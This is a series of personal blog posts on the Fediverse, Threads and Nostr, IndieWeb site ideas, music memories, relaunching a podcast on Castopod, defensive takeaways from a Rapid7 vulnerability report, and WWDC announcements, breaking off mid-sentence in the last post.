Here are my thoughts on EEE as it relates to Threads vs Fedi‚Ä¶ Thanks to our feeds here being follower-defined and not ‚Äúalgorithmic‚Äù, I don‚Äôt see how Threads posts (and thus Threads itself) could drown out my feed or anyone else‚Äôs feed unless they (the Fedi account) consciously decide to overwhelmingly follow Threads accounts. Plus, since we have access to Threads posts (for now) and not the other way around, this in some ways gives us MORE capability than those natively on Threads. 1 (One reply I received on Mastodon was around Threads-borne posts homogenizing the ‚ÄúAll Servers‚Äù/Federated timeline. This is an interesting concern. I‚Äôve never found that view to be of any particular use as it is already just a completely unmanageable stream of stuff that is not of interest to me, but if you are someone that has traditionally found it useful, maybe having Threads overwhelm it could be a valid (if not niche) concern for you. ) Now I can understand how you may see this as, ‚Äúthe traditional Fediverse is muted because our posts are not federated back‚Äù (this is presumably temporary as Threads continues enabling full Fediverse support), but this only amounts to having discussions siloed here vs there which is no different than how it was before they began the beta. I don‚Äôt see how Threads enabling any level of Fedi support makes their platform more attractive than staying here. If audience is all you care about (for example), Threads had this as a ‚Äúthreat‚Äù to Fedi from day one. 2 I think Threads can play in the Fediverse sandbox without the intention of destroying traditional Fedi. I‚Äôm not saying they don‚Äôt have the same surveillance capitalist goals for first-party users of their own platform but I think there are good reasons for them to enable AP support beyond trying to crush us or harvest our data. 3 Other large platforms have already started going the Fediverse path (i. e. Tumblr, Wordpress, Flipboard, Mozilla, Medium, etc‚Ä¶) and if Threads didn‚Äôt do this then someone else might have. *If* (and I realize it‚Äôs a big IF) they enable FULL AP support which in theory gives people the ability to move their accounts OUT of Threads (as they have indicated they are planning on doing), you might think this is a vulnerability for them in terms of platform lock-in. 4 But I think they have the hubris to believe they can build a platform superior on features and Local audience that they need not fear traditional Fedi. 5 Note: I should qualify that I am cursed with naive optimism üòÖ. I think what I mean to say is that the people who are here (on Fedi) are here because of what Threads isn‚Äôt, and what they can‚Äôt be. Everyone else is already on Threads or X-Twitter. Threads goal is to suck out what remains of Twitters user-base, enable AP-based Federation to block out Bluesky (and perhaps achieve some regulatory requirements around platform lock-in) and then play ball with other (previoulsy mentioned) large ActivityPub players. 6 The thing is, Mastodon has been humming along just fine since 2007 or so, long before Threads came along and all through the rise and fall of Twitter. There are communities there that are not going to leave and do not need more people to sustain themselves. They are insular, and self-sustaining (quite literally). Yes, there are prominent individuals within the Fediverse who are eager to grow the userbase and they see Threads federation as a mind-boggling huge win to that end but the failure to achieve native growth or growth by extension via Threads is not a death knell for the Fediverse. So as I‚Äôve written before, Mastodon (or more generally, the ‚ÄúFediverse‚Äù) will never die. Social Platform Bake-OffWhile we‚Äôre on this subject, I wanted to take a minute to conduct a mental bake-off (i. e. brainstorm) around what benefits we get by being on Threads vs. the ‚Äútraditional Fediverse‚Äù. Threads Pros: Larger audience / Local userbase Algorithmic feed (if that‚Äôs your thing) Fancy schmancy, well-designed client Faster to market features (given they have billions of dollars and hundreds of talented engineers). It is worth noting that at this point in their development, they are vastly behind in features that Mastodon clients support Easier to get signed up and started? (subjective perhaps)Traditional Fediverse Pros: Mastodon is teeming with advantages over Threads, read more hereMy conclusion is that Mastodon (specifically, as the largest and most developed of the Fediverse platforms) has an incredible and unbridgeable advantage as it compares to Threads. You used to be able to argue that Threads gave users access to a much larger network of people, but assuming Threads completes the act of bidirectional Federation, this advantage will be gone. Beyond that, its advantages are very minimal. Getting signed up for Threads is maybe a bit easier, sure. The algorithmic feed is nice if you are into that sorta thing (and many people I suppose are), but it pretty much stops there. I‚Äôm not saying that any significant majority of people will come to this same conclusion or ‚Äúsee the light‚Äù as it were, but I think these advantages are enough to keep enough people here that it is entirely immune to extinction.

[1] Intro to the post below‚Ä¶ In part of our launch of the Creator and Journalism Accelerators note1z866al6xs9xhnlqgwt0lkxr9lrynstyc52ls29sej96hfxpwxzws5u3m9u some people have asked why we‚Äôre doing this on Nostr and not ActivityPub and the Fediverse. It‚Äôs a good question, and the answer for me is about the way both the protocols and the culture of the people creating them work. I wrote this out here in a reply, but it deserves it‚Äôs own post. So here‚Äôs my why Nostr instead of Mastodon &amp; ActivityPub. Here‚Äôs his list of things that he believes are shortcomings of Mastodon &amp; ActivityPub‚Ä¶ (I‚Äôve numbered them to more easily address them later. ) There are a lot of things that Mastodon &amp; ActivityPub can‚Äôt do. User identities are tied to a server; if the server goes down, you lose your account, as happened when queer. af had their domain name seized. Users can‚Äôt migrate between servers. In some servers there‚Äôs a system where they can request a migration, where they can stop using one account and point their followers to a new account, but server admins need to allow this, and your followers don‚Äôt automatically follow your new identity on a new server. On a single server, it is impossible to change your username! Fediverse servers have total control over your account and data; they can see all of your private messages or write new ones on your behalf. The fediverse is a network of fiefdoms, each server admin having total control over their users. Often they are benevolent and use their power to decide what behavior is acceptable on their server, but it‚Äôs opaque. Most fediverse server admins keep their moderation and defederation decisions secret. So, users must choose a trust and safety regime without any understanding of the rules and how they‚Äôre enforced. When combined with the very limited ability to migrate between servers, only with server admin‚Äôs permission, it‚Äôs a problem. Each kind of fediverse server is isolated. You can use a Peertube instance to federate with other Peertubes for video, or Mobilizon for meetup-style events, or Pixelfed for Instagram-like photo sharing, or WriteFreely for blogs. But each of these is isolated. I need a new account on an instance of each of these servers. They all run the same protocol, but they aren‚Äôt actually interoperable. You can‚Äôt use a single fediverse identity with your profile and followers in Peertube, Mobilizon, WriteFreely, and Pixelfed. You need a totally separate account in each one. With Nostr, you can use dozens of apps all with your same identity, content, and followers. The fediverse has no privacy; there is no system of end-to-end encrypted messaging. In Nostr, you can have private direct messages and even private groups that are encrypted. Nostr even supports encrypted private file sharing. The fediverse has no system for micropayments. The zaps on Nostr enable easy ways to fund creators and journalists with either one-off tips or subscriptions to unlock paid content, like paid Substack newsletters or OF accounts. Lastly, and most importantly for me, the culture of fediverse server admins and developers is vindictive. It‚Äôs a community that attacks people who make proposals or want to try out new ways of using the network. That is why there is no search, no ability to choose an algorithm, no private groups, no private messages, no system for payments, etc. Those have all been proposed or even built, but the fediverse culture has gone after those people, punishing them for suggesting new ways of doing things. Here are my thoughts on what Rabble said‚Ä¶ Agreed. This is known weakness, though what happened with queer. af is certainly an anomaly. You can also mitigate this in other ways such as A. running your own server, B. choosing a more established/stable instance and/or C. deploying a Webfinger redirect to have your domain point to whatever your Fediverse instance handle is. This is false. Mastodon, and many other Fediverse platforms do allow migration of an account to another server and the protocol has the ability to migrate your followers as well. Now that migration process is somewhat clunky but it DOES work. I‚Äôve never tried this, but it seems like a pretty small detail. I can change my display name if I want to though ü§∑‚Äç‚ôÇÔ∏è. Agreed. ActivityPub and DMs on AP platforms is not secure. Agreed. There are many awesome servers that are run either as a community or by really great teams of admins/moderators. Others though, not so much. This is debateable. The beauty of AP is the cross-platform experience I can get in terms of following and interacting with accounts on other services. Plus, with ‚Äúsign-in-with-Mastodon‚Äù there is even more ability to have a single account across multiple apps. Agreed. Though, social apps may not be the best mediums for ‚Äúprivacy‚Äù to begin with. LoL. I don‚Äôt know what a Zap is, but if it‚Äôs anything ‚Äúcrypto‚Äù related, it‚Äôs hard to take it seriously here. Setting aside whether the entire cryptocurrency ‚Äúthing‚Äù is a huge grift or not, I can at least comfortably state that its at best volatile in terms of popularity and still not mainstream enough where most would want to rely on it in this context. Culture. This is an interesting debate point. Mastodon has millions of users and yes, there is a very opinionated minority that is somewhat reflexive and defensive for many reasons. But Mastodon, and the wider Fediverse (now especially thanks to Threads) is incredibly diverse and that one group hardly speaks for the masses. Nostr on the other hand has been extremely mono-culture, that culture of course being weird Crypto-folks. I like Nostr, I think the tech is cool and the benefits for some are clear, but unless that community can outgrow the weird crypto-culture and make other parts of the service more ‚Äúapproachable‚Äù to regular folks, I don‚Äôt think it can take off in any meaningful way.

I believe they think this because they equate ‚Äúhaving a website‚Äù with ‚Äúhaving a blog‚Äù. But this isn‚Äôt the case! An IndieWeb site for example is nothing more than having your own domain where you have published something to it. That something could be anything! Sure, a lot of websites do have some sort of ‚Äúblog‚Äù component where the site owner publishes new content at some interval but this is not a required characteristic for a website. There is in fact a lot of really fun things you can do with a website without ever needing to post content in ‚Äúblog‚Äù format. In fact, the IndieWeb itself is not about blogging, it‚Äôs about you. So what can we put on a website if not a blog? Blogging is afterall, time consuming and expectation-laden. So instead, let‚Äôs do some simpler, more fun things that I believe almost anyone has to share. About: Start with an ‚Äúabout‚Äù page! There is no standard format, just write whatever you want to share about who you are, what you like, what the site is about, really anything! Blogroll: A ‚Äúblogroll‚Äù is a simple page meant to share and link to other sites on the web that you like. If you‚Äôre on the Internet, there has got to be places you enjoy going. Typically this focuses on other indie sites but you‚Äôre free to share whatever you like! Ideas: An ‚Äúideas‚Äù page (typically located at [site]/ideas) is also a simple concept. Just list any ideas you have for your site, for other projects you have, for things in your life or just ideas in general. There is again, no real format. Just what ideas do you have! Notes*: A ‚Äúnote‚Äù is basically just any short piece of writing. Notes are to a site, what a post is to a microbloging site like Mastodon or Twitter. The idea is that any silly little 10 word post that you might drop on social media you could also publish as a ‚Äúnote‚Äù on your site. So consider instead of having traditional full-length ‚Äúblog‚Äù posts, you could instead microblog directly on your site. Publish whatever you like, no matter how long it is. It doesn‚Äôt need to be well-researched or even coherent. It is your site and you can just note things into the Internet void. The concept of a note allows people to effectively ‚Äúblog‚Äù without all the expectation that comes with normal blogging. Now: A ‚Äúnow‚Äù page is probably one of the best IndieWeb additions to a site that anyone can do. A now page (typically located at [site]/now) is a place for you to write about or list just things you are up to currently. What are you listening to, working on, reading, watching, learning, thinking about, or just ‚Äúdoing‚Äù in general. Everyone is doing something, so you can just put it on this page! It isn‚Äôt really meant to be serious so there is no real expectation. Just a fun thing to do. Social Links: A simple feature for an IndieWeb site. Just put some links to other places you exist on the web. Social media sites, email, whatever! Uses: A ‚Äúuses‚Äù page is where you share anything you are using. What software, what tools, what kitchen appliances, literally anything. Everyone uses things, so you can write about them or simply list them out here! (A Uses page is typically located at [site]/uses)So as you can see, even without a blog, you can share a rich set of things on a personal site. You can update these single pages when you feel like it, and make them uniquely yours as none of them really have any expected format. Make the site yours, the web is ours. If you've gone ahead and made your site but are looking for more inspiration or things to do, you could read about why I blog, a list of other things to add to your site, using your site as your identity, other website content types and really all other things I write about blogging.

The #indieweb is a place to be yourself, and find others who are, well. . who THEY are. Forget about likes, forget about follower counts, forget about page views. I have found, both in my own experience writing on my site as well as in my journey exploring other sites across the ‚Äúindieweb‚Äù that it‚Äôs people being truly genuine in both their writing and their style that brings life back to the web. Before ‚Äúshellsharks‚Äù, I tried and failed a few times at starting a ‚Äúblog‚Äù / website. Though I could probably point to a few reasons why those projects never took off, I think the root cause was ultimately me writing for someone else, rather than just for myself. Putting ridiciulous expectations on writing cadence / content, or boxing myself into a specific ‚Äúniche‚Äù, whatever. It made the process of building the site and writing very inauthentic and just, not fun. Once I let all that go, and started writing for me, that‚Äôs when it stuck. Though I‚Äôve had lulls over the years, I‚Äôve continually come back to it, re-styled, re-architected, added things, and just wrote. I don‚Äôt limit myself in what I write about either, and though I have been fortunate to develop somewhat of an ‚Äúaudience‚Äù over time, I don‚Äôt write for them per say. I write about what I‚Äôm interested in and it just so happens that others are interested in those same things! I think you‚Äôll find that you would be hard-pressed to have interests that are not shared by at least a few other people somewhere out in the world and on the Internet, it‚Äôs a weird and diverse place afterall. The IndieWeb is also uniquely un-algorithmic. In a world where everyone has turned ‚Äúinfluencer‚Äù, and every social interface, even Mastodon, is tuned and swayed by black-box algos, like counts and boosts, your ‚Äúpersonal‚Äù site can be a haven. One of no-pressure idea sharing, brain dumping, therapeutic writing, really whatever you want it to be.

(See also this one with respect to not feeling part of the ‚Äúcommunity‚Äù. ) Let me be extremely clear. You do not need Webmentions to be part of the ‚ÄúIndieWeb‚Äù. The only real ‚Äúrequirement‚Äù, if you want to think of it that way, is to just have your own site on your own domain where you put your own stuff. That‚Äôs it. How you make it look, what you put on there, what fancy IndieWeb. org ‚Äúbuilding blocks‚Äù you decide to implement, doesn‚Äôt make your site any more or less ‚ÄúIndieWeb‚Äù than any other. Indieweb. org is a great resource. But I fear that for as much good as it does, it can do equal harm. On the surface, Indieweb. org has a fantastic message. What is the IndieWeb? The IndieWeb is a people-focused alternative to the ‚Äúcorporate web‚Äù. It is a community of independent and personal websites connected by open standards and based on the principles of: owning your domain and using it as your primary online identity, publishing &gt; on your own site first (optionally elsewhere), and owning your content. Your content is yours When you post something on the web, it should belong to you, not a corporation. Too many companies have gone out of business and lost all of their users‚Äô data. By joining the IndieWeb, your content stays yours and in your control. You are better connected Your articles and status messages can be distributed to any platform, not just one, allowing you to engage with everyone. Replies and likes on other services can come back to your site so they‚Äôre all in one place. You are in control You can post anything you want, in any format you want, with no one monitoring you. In addition, you share simple readable links such as example. com/ideas. These links are permanent and will always work. The message is simple. The IndieWeb is about people. It‚Äôs about owning your own domain and putting your stuff there. Great! But just below the surface, as you start to click on some of the links, IndieWeb. org begins to preach complexity. IndieAuth, Webmention, Micropub, WebSub, Microsub, building blocks, microformats, backfeeds, etc‚Ä¶ These convolutions are niche, techno-aristocratic IndieWeb fever dreams which discourage and alienate those desperate to break from corporate web-silos and start anew on a simpler, more human web. Ignore them. A note on ‚Äúcommunity‚Äù‚Ä¶ If you are reading this, or you have a personal site, you are already part of it. Full stop. You don‚Äôt need to be shy. You have things to say and people WANT to listen, they want to read, they want to connect. You don‚Äôt have to be an ‚Äúinfluencer‚Äù or have a big following. Your writing doesn‚Äôt need to be AMAZING. You don‚Äôt need to write to an audience. Write for yourself. Then share it. People will be interested I promise you. The #indieweb revival is here and you are 100% invited! Tell your friends. So, hopefully this message can make it out to those who need to hear it‚Ä¶ You want to be part of the IndieWeb? Be one of us? Get a domain. Put your site on it. Be yourself. Because the IndieWeb is about you.

I‚Äôll attempt to write these in a chronological fashion as best as my memory will allow‚Ä¶ (Note: All music links are to Apple Music listings. ) Somewhere within my childhood: I have a lot of memory fragments of assorted music from my childhood, most of it stuff my dad really liked. e. g. Driving at night in the car listening to Zombie by The Cranberries or hearing my dad sing Photograph by Def Leppard and a number of songs by The Goo Goo Dolls. ~1997-2000: I can‚Äôt pin down the exact year, but I remember listening to A LOT of Celine Dion courtesy of my sister and the drives we had when she would drop me off at school when we lived in Jacksonville, FL. I remember she was in High School at the time. Specifically, I remember listening to It‚Äôs All Coming Back to Me Now &amp; That‚Äôs The Way It Is a lot. Like, every single morning a lot. 2000: Hybrid Theory from Linkin Park is one of those rare albums where every song is good and I will listen to the entire album without skipping any of ‚Äòem. It has also stayed in my regular listening rotation for nearly 25 years now. When this album came out, it was all I listened to. If you had asked me what kinda music I liked back then, I would have just shown you the Hybrid Theory CD case. I honestly don‚Äôt think I really cared about music before this album came out. 2000: The Infest album from Papa Roach is also a big one from my early music-listening days. I sang each of these songs endlessly. I remember convincing my grandma to buy it for me at some flea market in South Carolina and she being very concerned about the parental advisory warning üòÇ. 2001: Blurry by Puddle of Mudd and Crawling in the Dark by Hoobastank were both mini-obsessions built on top of my love for Linkin Park. 2001-2002: My sister was constantly singing both Complicated by Avril &amp; Everywhere by Michelle Branch when they came out. It‚Äôll always remind me of my parents house in Stafford and how it looked at that time. ~2002-2004: I can‚Äôt pin down exactly when, but I vividly remember the first time I listened to Stairway to Heaven. I was going through my dad‚Äôs collection of vinyl records and playing them on a turntable I had set up under my bunk bed. I must have replayed the song 5 or 6 times (maybe more) after that first listen. It was I think the exact moment where I pivoted into classic rock as a core musical preference. ~2003: In highschool I went through a BIG AFI phase, and really loved the Sing the Sorrow album that came out around my freshman year. (I also really enjoyed The Art of Drowning &amp; Black Sails in the Sunset). It‚Äôll always make me think of that time in my life. 2003: There were a few months that I think I just listened to the album Year Of The Spider by Cold. Notably, the songs Cure My Tragedy, Wasted Years, The Day Seattle Died &amp; Black Sunday. Peaky teen angst type-uh stuff. 2003: A rendition of A Favor House Atlantic by a friend at lunch in high school introduced me to Coheed &amp; Cambria. When Good Apollo I‚Äôm Burning Star IV came out 2 years later, I remember some friends playing Welcome Home on my stereo in the basement and was blown away. Will never forget. Still one of my favorite artists of all time. ~2003-2006: At some point in High School I saw this YouTube video featuring Metallica‚Äôs song No Leaf Clover. I loved DBZ at the time and this song was just insanely good. I‚Äôll always associate the two. ~2005: I remember filming a very silly cover of Jeezy‚Äôs Soul Survivor, I dubbed it ‚ÄúBacon &amp; Young Cheesy‚Äù where I was ‚ÄúBacon‚Äù and my brother was ‚ÄúYoung Cheesy‚Äù. I held a package of bacon in my hand while my brother waved around a frozen Stouffers Mac ‚Äòn cheese. It‚Äôs a shame I don‚Äôt remember the lyrics we came up with. Silly silly stuff. ~2005-2006: One summer in high school I worked at Kings Dominion. For some reason I listened to The Beatles album Abbey Road every morning during that commute. ~2006+: I had not one, but TWO Elvenking CDs (The Scythe &amp; Heathenreel) I had burned in my Kia Sephia that I would listen to all the time. Whenever I would drive my friends anywhere they would joke that I was always listening to Elvenking. They expected me to play it too anytime they were in the car. I didn‚Äôt disappoint. ~2006: Into the Ocean by Blue October always reminds me of an internship I had in DC where I commuted in with my dad. It was a frequent play on the radio during that time. ~2011: The song We Found Love by Rihanna will always remind me of the first time I went to Mardi Gras. Though admittedly a lot of those memories are quite hazy. 2016: Closer by Chainsmokers always reminds me of my wedding. 2019: When me and my wife were in Prague, we heard a beautiful rendition of Many Shades of Black by The Raconteurs. I wish I had a recording. 2020+: OK. So in 2020 my son was born and as new parents we didn‚Äôt exactly have everything figured out. Putting this kid to sleep was of notable difficulty. In one such event, I was trying to get my son to sleep and walked him upstairs to the bathroom where my wife was showering. She was listening to 34+35 by Ariana Grande. Upon hearing the song, my son immediately calmed down. Desperate, I took that as a sign that he loved Ariana Grande. Turns out, I think I was onto something. From then on, we played the album (Positions) for him at every nap time and magically, it really did put him to sleep or otherwise had a very calming effect. As a result, it will forever be in my top songs ever played because I had to listen to this full album 3x+ times a day for, and I am not kidding here, YEARS.

Where did it go? Why did it go? Well, life got a little busy, and I just didn‚Äôt make time for it I suppose. I really enjoyed the first run of the podcast but never got in a sustainable groove when it came to fielding new guests for the show. I really don‚Äôt want the show to be a solo operation, i. e. just me talking, and as cool as it would be to have a regular co-host, one thing I really enjoyed most about the experience was meeting with and talking to new and interesting people in and around the infosec / larger tech community. So this time around, my plan is to be more committed to building a pipeline of folks to come on the show and to a degree, expand what is regular topics of conversation. Notably, tying themes of infosec/cybersecurity with that of the indieweb, personal web and social web. I want to add that I really appreciate those of you who subscribed the first time around and have shown interest in the show returning in the months/years since I aired the last episode. It means a lot! But that‚Äôs not all that‚Äôs new about the show! Somewhat fresh off my big-time foray into the Fediverse, the podcast is now powered by Castopod! It is, in short a free and open-source solution for podcasting and notably has the ability to federate a podcast such that accounts on other federated social platforms (i. e. Mastodon) can follow. So when new episodes are released, it will be posted on the show‚Äôs account and people can even comment on those posts! So if you‚Äôre interested in listening to me chat with others in the infosec / tech / indieweb / social web communities, Subscribe today! K&amp;T Host: On the matter of hosting - I‚Äôm moving away from Podbean and am now hosted on K&amp;T Host. A quick note on Podbean: It is a simple, cost-effective and easy to use platform for podcast hosting. For newbies like myself to the space, it was a great experience and I would continue to recommend them to others. OK, so about a week ago I asked the Fediverse if they had any opinions or experience with Castopod and to my delight, a representative from K&amp;T Host reached back out about their beta offering for managed Castopod. Now I had never heard of K&amp;T Host but decided to give the beta a try as it was free, their website looks great and their support staff seemed very engaging and responsive. Getting my account set up and the podcast initiated within the Castopod portal on K&amp;T Host was incredibly easy. There‚Äôs plenty to fiddle with in the various settings menus within Castopod, but if you just want to get your show up and import episode files it couldn‚Äôt be easier. The only issues I‚Äôve really encountered so far have been with Castopod itself and seemingly not with the underlying hosting infrastructure. The only small snag that I had to overcome at first was upping the max file size upload limit for podcast files as it was set way too low by default. A quick support ticket and I was able to adjust this myself by remoting into the provisioned instance and changing a config file. On the matter of K&amp;T Host support, they are lightning quick, and super helpful. I‚Äôm happy with K&amp;T Host and plan to continue with them through the beta and into their public offering at which point I will be converted into a paying member. All beta testers not only receive free hosting during the beta period, but will also receive 3 months free post-beta and a 20% discount for the lifetime of the service. This sounds like an incredible deal and I would recommend anyone else curious about moving or starting a podcast with Castopod to check it out! A quick note about pricing. Castopod. com, which is the quasi-official hosting engine for Castopod powered podcasts has what I think is kinda aggressive pricing. You can see their pricing page here. For reference, i was paying just over $100 ($9/mo) at Podbean for unlimited audio. I could have gotten away with the ‚Ç¨10/mo option at Castopod. com for a while as I only have a backlog of ~20 episodes to move over, but it wouldn‚Äôt be long until I exceeded their storage threshold and would need to move up a tier to their ‚ÄúPodcaster‚Äù tier which is priced at ‚Ç¨24/mo or ‚Ç¨288/year! Now K&amp;T Host hasn‚Äôt announced official pricing for their Castopod offering, but I did ask them what I should expect and they gave me the following estimate. Spec‚Äôed with 2GB memory and 200GB of storage I would be looking at around $6. 75/mo, even cheaper than what I had with Podbean! Plus you throw in a 20% lifetime discount and 3 months free and the difference is pretty stark. Their pricing model moves up incrementally from there as your storage, processing (and maybe bandwidth) needs increase, rather than having to have huge t-shirt size jumps in pricing. Castopod Observations: I still have a lot to learn and experience with Castopod (v1. 8. 2) itself, but here are some observations thus far. It‚Äôs great that I can host the show on my own (sub)domain. Instead of going to podbean. com, you can instead go to podcast. shellsharks. com. This is something I‚Äôve wanted from the beginning. Castopod supports show permalinks, the concept of ‚Äúseasons‚Äù, full / trailer / bonus episode-types, parental advisories, markdown-powered show notes, advanced RSS tagging capabilities and even premium/paid episodes. You can import an entire podcast from somewhere else. Unfortunately I didn‚Äôt see this option until after I had already manually brought all the audio files over. Oops! Since Castodpod is ‚ÄúFediverse-compatible‚Äù, you can do things like block accounts and even entire domains from accessing your federated podcast profile, you can post and reply to comments, and other social things. The podcast‚Äôs handle is @ShellsharksPodcast@podcast. shellsharks. com. You can also create other accounts to access the admin portal, co-host or guest profiles and more within the Castopod administrative portal. Additional pages can be created on the domain for anything you would want. Podcasting 2. 0 support. I‚Äôm stoked about this new era of The Shellsharks Podcast and hope you will tune in!

Below I‚Äôve listed a few of my own personal takeaways after reading through the report‚Ä¶ The report covers only about ~60 known exploited vulnerabilities from 2023 through early 2024 (but also includes data from even more vulnerabilities from past years) They specifically call out the demise (or severe degradation) of Twitter and what that has meant for the infosec-related intel sharing community. Couple this with more recent struggles from NVD and you see a big gap in the open/public vulnerability intelligence capability R7 observed a much higher percentage of successful ‚Äúattacks‚Äù being attributed to highly orchestrated campaigns &amp; multi-level exploit chains by single well-resourced adversaries What was on the target menu? A lot of edge services, e. g. file sharing, remote access, external confluence, etc‚Ä¶ The median time to known exploitation is 1 day. Wow, i. e. critical things need to be patched immediately (&lt;24h) and patching alone is not sufficient defense Speaking of defense, here is what R7 recommends: external MFA, reducing external attack surface, a hearty ransomware defense package (which includes a number of things including backups), a robust patching/VM strategy, EDR and bolstering access control (i. e. Zero Trust) There‚Äôs a lot more in the report so go and read it. Great work by the Rapid 7 team as usual. While we‚Äôre talking defense, I had the idea to map R7‚Äôs recommended security controls to the CIS critical security controls and here‚Äôs what I came up with‚Ä¶ (for CIS CSC v8) CSC 6: Access Control / MFA CSC 7: Vulnerability Management CSC 10: Malware Defense (e. g. EDR) CSC 11: Data Recovery (i. e. Ransomware defense)Notably though, I found nothing in the CIS CSC controls which explicitly calls out attack surface reduction ü§î.

Find potential guests for the show. Though I can source them from really anywhere, I tend to find a lot of people from cool blogs/sites I encounter and those posting interesting things on social media / the Fediverse. (~2m) Reach out to potential guests and ask if they would like to be on the podcast. When I reach out, I‚Äôll usually provide some sample discussion topics. (~2m) If they are interested, I send them a prepared logistics document and scheduling information. Also, I work with them on actually scheduling a time to record. (~5m) I then do more research on potential topics to discuss and share that list with the guest. (~10m) Record the show. I can record over any voice chat platform (i. e. Face Time, Discord, Meet, Zoom, Teams, etc‚Ä¶) (~60-90m) Take raw audio files (my audio file and my guests audio file) and drop into GarageBand. (~2m) Level the audio, i. e. make sure we are at the same-ish volume. (~5m) Clip the beginning and end of the podcast to ensure it starts and ends somewhat fluidly. (~10m) If any additional editing is needed (which I try avoid), I do it here. (varies) Add in the outro music sequence. (~5m) Export the final mixed audio as . mp3. (~2m) Drop the . mp3 into Forecast. (~1m) Add show art, show title and show description to . mp3 metadata. (~2m) Add chapter titles and timestamps. Listen back through the show to capture all things that need to be documented or linked to in the show notes. This is by far the longest step, even moreso than actually recording the podcast. (~90-150m) Upload and publish on my podcast hosting provider! (~5m) Back to step 1. Hopefully this gives you an idea of the time it takes to produce a single episode of the show (about 3-4 hours).

When I first started the blog I didn‚Äôt have a particularly clear idea of what I wanted to do with it, but I had the idea to write that piece and one other idea which which was to catalog all named vulnerabilities. Beyond that, I just wrote about whatever came to mind. It‚Äôs been 5 years to the day since I got that first piece out and not only has the site come a long way, but so have I. In the beginning, I think my main focus was to keep the site mostly infosec-related in terms of my writing, but even back then I left the door open to write about other things. Afterall, the tagline for my site has always been ‚ÄúInfosec, Technology, Life‚Äù. The first 4 years of the site did end up skewing mostly Infosec / Tech but since discovering the IndieWeb last year, I have made a noticeable shift towards writing more about ‚ÄúLife‚Äù, i. e. anything non-tech / non-infosec, and it‚Äôs been a lot of fun! The site has also gone through a number of big aesthetic overhauls and architectural redesigns. There will always be new things I want to add to the site or ways in which I wish I could rearchitect it even further, but for now, I am quite happy with the latest generation of its look-and-feel as well as the functionality itself. I‚Äôve not maintained the same level of active-ness throughout the last 5 years, but in more recent history I‚Äôm quite pleased with the amount of attention I‚Äôve given it, the upgrades I‚Äôve made, and the writing I‚Äôve produced, and I am certainly starting the next 5 years quite strong. I plan to continue to funnel my professional work, technological side quests and life experiences into what I write about. I really want to thank everyone who has read anything I‚Äôve written, those who have offered kind words over social media or elsewhere, those who have given me meaningful/constructive feedback and anyone who has taken the time to subscribe, like or engage with me or my writing. Like many who start a blog, I had no expectation of building a readership. I started it with the intention of sharing my oft-repeated guidance on getting into the infosec field and as a place to write resources for myself. Over time though I have found that sure enough, there are people out there who enjoy, or get value out of what I have documented or what I have to say and it is undoubtedly a good feeling. These days, I spend as much if not more effort writing about and encouraging others to start a site and be themselves as I do writing about tech/infosec. My experience with shellsharks has taught me more about what it means to be authentic on the web than it has helped me with my various infosec-related research things. I‚Äôm still a cybersecurity professional and as such will continue to make that a focus of what I learn and thus what I write about, but it is clear to me that I‚Äôve developed a passion for IndieWeb advocacy and I hope to continue to inspire others both in my field and abroad to start their own journey in the personal web.

Notes and analysis across all the OS updates from the event, Apple TV+, visionOS 2, iOS 18, AirPods &amp; Home, watchOS 11, iPadOS 18, macOS Sequoia and Apple‚Äôs newly introduced AI capabilties. Apple TV+Apple teased a number of returning shows, new shows and new movies with a lot of star power. Most exciting for me though, is the return of Severance! visionOSI‚Äôm not a Vision Pro wielder, nor am I intimately familiar with its current feature set / real-world capabilities but from what I‚Äôve gathered based on the newly announced ‚Äúfeatures‚Äù and some of the feedback from prominent Apple journalists, visionOS 2 is pretty lackluster. Hell, one of the features they slapped onto the ‚Äúnew feature grid‚Äù graphic was ‚ÄúMouse Support‚Äù. Ooph. This seems like a platform they are having a hard time putting real engineering resources into. Is it due to low adoption? Maybe they‚Äôve been too caught up trying to bring Apple Intelligence (i. e. genAI capabilities) to their platforms? Who knows. iOSiOS 18 brings a lot of aesthetic customizability and quality of life improvements, without any real breakthrough functionality. I‚Äôve listed out some of the more interesting added features below‚Ä¶ More homescreen customizability, i. e. place app icons/widgets wherever and giving your homescreen icons a uniform color scheme Control Center now has more native controls, control pages and an API for developers to expose third-party app control toggles You can lock and/or hide apps Messages now sports any-emoji tapbacks, text-formatting and text effects Maps now has topographic data which is nicely paired with new hiking route capabilities Apple takes a swing at Venmo with the Wallet apps new ‚Äútap to cash‚Äù feature Journal app now compiles ‚Äúinsights‚Äù into a dashboard and adds a basic search feature The photos app has been ‚Äúredesigned‚Äù, though the redesign looks fairly lackluster despite how excited they seemed for it during the recording Though not given any stage time, Messages now supports RCS Maybe the most interesting feature they announced was the ability to send iMessages and regular text messages via satellite, even in non-emergency situations. Is this a free capability? Would this mean I don‚Äôt need a cellular plan to send messages? Lots of questions here‚Ä¶Overall, not a huge update, but one in which I am excited to get my hands on in the fall when they ship the final release. Audio &amp; HomeThey grouped the AirPods (‚ÄúAudio‚Äù) and smart home (‚ÄúHome‚Äù) updates in the same presentation section. Mostly ho-hum announcements here. Two things I‚Äôll call out though‚Ä¶ First, they coded up a feature they‚Äôre calling ‚ÄúEnchance Dialogue‚Äù which will accentuate spoken word in movies/shows. This comes as a response to people increasingly using subtitles when they watch TV because they can‚Äôt make out what actors are saying. Whether this speaks more to the current state of sound mixing in film/TV production or our ability to actually pay attention to what we are watching (instead of always being distracted with second screens) I really can‚Äôt say. Second, they spent a fair amount presentation time debuting a Snoopy/Woodstock Apple TV screen saver. Look, I kinda like Snoopy / Charlie Brown but is there really a big enough market for this? I wouldn‚Äôt use this screen saver as it is not nearly as cool as their stunning landscape screen savers. watchOSwatchOS 11 introduces a new ‚ÄúVitals‚Äù app which aggregates metrics/data from the various onboard health sensors, a new training mode which can calculate intensity of your workout and more customizable control over your daily activity rings, letting you set a per-day goal and take into account things like rest days (finally!). Some nice features here in what is a decent iterative update. iPadOSiPadOS 18 is basically just what they announced for iOS 18. The only thing maybe worth mentioning that is unique to the iPad is ‚ÄúSmart Script‚Äù, which does some cool Apple Pencil-related things. A big let-down for those who main iPads though I suspect. macOSmacOS Sequoia has a decent sleight of new features, but mostly plays catchup, with some sherlocking thrown in for good measure. You can now mirror/control your iPhone directly on your Mac (okay?), tile &amp; snap application windows, and there is a new dedicated passwords app coming. There is also some gaming-related things but honestly I don‚Äôt game on the Mac. I‚Äôve been a 1Password user for a long time. Time will tell, but I didn‚Äôt see enough from this first iteration of Apple‚Äôs password manager to convince me to migrate from 1Password. They will need to convince me that they have solid multi-device/multi-platform support, dependable iCloud backup/sync, offline backup (in case iCloud does something 